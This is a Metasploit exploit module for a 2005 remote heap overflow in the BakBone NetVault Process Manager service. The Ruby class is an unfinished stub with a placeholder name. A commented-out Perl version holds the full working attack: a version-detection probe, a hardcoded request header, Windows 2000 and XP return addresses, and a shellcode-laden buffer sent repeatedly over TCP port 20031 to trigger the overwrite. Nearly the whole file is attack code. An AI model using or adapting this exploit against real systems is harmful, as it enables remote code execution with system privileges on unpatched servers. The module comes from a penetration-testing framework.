require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'BakBone NetVault Remote Heap Overflow',
			'Description'    => %q{
				This module exploits a heap overflow in the BakBone NetVault
				Process Manager service. This code is a direct port of the
				netvault.c code written by nolimit and BuzzDee.
					
			},
			'Author'         => [ 'hdm', '<nolimit.bugtraq[at]gmail.com>' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'BID', '12967'],
					[ 'MIL', '12'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00\x20",
					'Prepend'  => "\x81\xc4\xff\xef\xff\xff\x44",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000, winxp',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Apr 01 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::bakbone_netvault_heap;
use strict;
use base "Msf::Exploit";
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'  => 'BakBone NetVault Remote Heap Overflow',
	'Version'  => '$Revision$',
	'Authors' =>
	  [
		'H D Moore <hdm [at] metasploit.com>',
		'<nolimit.bugtraq[at]gmail.com>',
	  ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp' ],
	'Priv'  => 1,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 20031 ],
	  },
	  
	'Payload' =>
	  {
		'Space'     => 1024,
		'BadChars'  => "\x00\x20",
		'Keys'      => ['+ws2ord'],
		# sub esp, 4097 + inc esp makes stack happy
		'Prepend' => "\x81\xc4\xff\xef\xff\xff\x44",		
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a heap overflow in the BakBone NetVault
	Process Manager service. This code is a direct port of the netvault.c
	code written by nolimit and BuzzDee.
}),

	'Refs'  =>
	  [
		['BID', 12967],
		['MIL',    12],		
	  ],  
	 
	'Targets' =>
	  [
		[ 'Windows 2000 SP4 English',   0x75036d7e, 0x7c54144c ], # esi+4c / UEF
		[ 'Windows XP SP0/SP1 English', 0x7c369bbd, 0x77ed73b4 ], #        / UEF
	  ],
	  
	'Keys'  => ['netvault'],

	'DisclosureDate' => 'Apr 01 2005',
};

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	
	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	  );

	if ($s->IsError) {
		$self->PrintLine("[*] Socket error: " . $s->GetError());
		return $self->CheckCode('Connect');
	}
	
	my $hname = "METASPLOIT";
	my $probe =
		"\xc9\x00\x00\x00\x01\xcb\x22\x77\xc9\x17\x00\x00\x00\x69\x3b\x69".
		"\x3b\x69\x3b\x69\x3b\x69\x3b\x69\x3b\x69\x3b\x69\x3b\x69\x3b\x69".
		"\x3b\x73\x3b\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00".
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00".
		"\x03\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00".
		pack('V', length($hname)+1). $hname . "\x00";
	
	$probe .= "\x00" x (201 - length($probe));
	$s->Send($probe);
	my $res = $s->Recv(-1, 10);
	$s->Close;
	
	my $off = index($res, "NVBuild");
	if ($off != -1) {
		$off += length('NVBuild')+ 1 + 12 + 1;
		my $ver = int(substr($res, $off+4, unpack('V', substr($res, $off, 4))));
		
		if ($ver > 0) {
			$self->PrintLine("[*] Detected NetVault Build $ver");
			return $self->CheckCode('Detected');
		}
	}
	return $self->CheckCode('Safe');
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

	my $target = $self->Targets->[$target_idx];
	my ($res);

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}
	
	# Request header taken from netvault.c by nolimit and BuzzDee
	my $head =
	pack('C*', 
		0x00, 0x00, 0x02, 0x01, 0x00, 0x00, 0x00, 0x8f, 
		0xd0, 0xf0, 0xca, 0x0b, 0x00, 0x00, 0x00, 0x69, 
		0x3b, 0x62, 0x3b, 0x6f, 0x3b, 0x6f, 0x3b, 0x7a, 
		0x3b, 0x00, 0x11, 0x57, 0x3c, 0x42, 0x00, 0x01, 
		0xb9, 0xf9, 0xa2, 0xc8, 0x00, 0x00, 0x00, 0x00, 
		0x03, 0x00, 0x00, 0x00, 0x00, 0x01, 0xa5, 0x97, 
		0xf0, 0xca, 0x05, 0x00, 0x00, 0x00, 0x6e, 0x33, 
		0x32, 0x3b, 0x00, 0x20, 0x00, 0x00, 0x00, 0x10, 
		0x02, 0x4e, 0x3f, 0xac, 0x14, 0xcc, 0x0a, 0x00, 
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 
		0xa5, 0x97, 0xf0, 0xca, 0x05, 0x00, 0x00, 0x00, 
		0x6e, 0x33, 0x32, 0x3b, 0x00, 0x20, 0x00, 0x00, 
		0x00, 0x10, 0x02, 0x4e, 0x3f, 0xc0, 0xa8, 0xea, 
		0xeb, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
		0x00, 0x01, 0xa5, 0x97, 0xf0, 0xca, 0x05, 0x00, 
		0x00, 0x00, 0x6e, 0x33, 0x32, 0x3b, 0x00, 0x20, 
		0x00, 0x00, 0x00, 0x10, 0x02, 0x4e, 0x3f, 0xc2, 
		0x97, 0x2c, 0xd3, 0x00, 0x00, 0x00, 0x00, 0x00, 
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
		0x00, 0x00, 0x00, 0xb9, 0xf9, 0xa2, 0xc8, 0x02, 
		0x02, 0x00, 0x00, 0x00, 0xa5, 0x97, 0xf0, 0xca, 
		0x05, 0x00, 0x00, 0x00, 0x6e, 0x33, 0x32, 0x3b, 
		0x00, 0x20, 0x00, 0x00, 0x00, 0x04, 0x02, 0x4e, 
		0x3f, 0xac, 0x14, 0xcc, 0x0a, 0xb0, 0xfc, 0xe2, 
		0x00, 0x00, 0x00, 0x00, 0x00, 0xec, 0xfa, 0x8e, 
		0x01, 0xa4, 0x6b, 0x41, 0x00, 0xe4, 0xfa, 0x8e, 
		0x01, 0xff, 0xff, 0xff, 0xff, 0x01, 0x02
	);	
	
	my $pattern = $self->MakeNops(39947) . "\x00\x00\x00";
	substr($pattern, 0, length($head), $head);
	
	substr($pattern, 32790, 2, "\xeb\x0a");
	substr($pattern, 32792, 4, pack('V', $target->[1]));
	substr($pattern, 32796, 4, pack('V', $target->[2]));
	substr($pattern, 32800, length($shellcode), $shellcode);
	
	$self->PrintLine("[*] Attemping to exploit target '".$target->[0]."'...");

	
	# NetVault does not handle partial recv's correctly, so we need
	# to make multiple attempts at writing the full string...
	
	my $res = 0;
	my $try = 0;
	my $s;
	
	while ($try < 15 && $res != length($pattern)) {

		$s = Msf::Socket::Tcp->new
		  (
			'PeerAddr'  => $target_host,
			'PeerPort'  => $target_port,
		  );

		if ($s->IsError) {
			$self->PrintLine("[*] Socket error: " . $s->GetError());
			return(0);
		}
		
		$res = $s->Send($pattern, 0);
		$try++;
	}
	
	if ($res != length($pattern)) {
		$self->PrintLine("[*] Could not write the full request to the server");
		return;
	}
	
	$self->PrintLine("[*] Overflow request sent, sleeping for four seconds ($try tries)");
	select(undef, undef, undef, 4);
	
	$self->PrintLine("[*] Triggering the memory overwrite by reconnecting...");
	for( 1 .. 10) {
		my $x = Msf::Socket::Tcp->new
		  (
			'PeerAddr'  => $target_host,
			'PeerPort'  => $target_port,
		  );
		last if $x->IsError;
		$x->Send($pattern, 0);
		$self->PrintLine("[*]    Completed connection #$_");
		select(undef, undef, undef, 1);
	}
	
	$self->PrintLine("[*] Waiting for the payload to execute...");
	select(undef, undef, undef, 4);
	
	$self->Handler($s);
	return;
}

1;

=end


end
end	
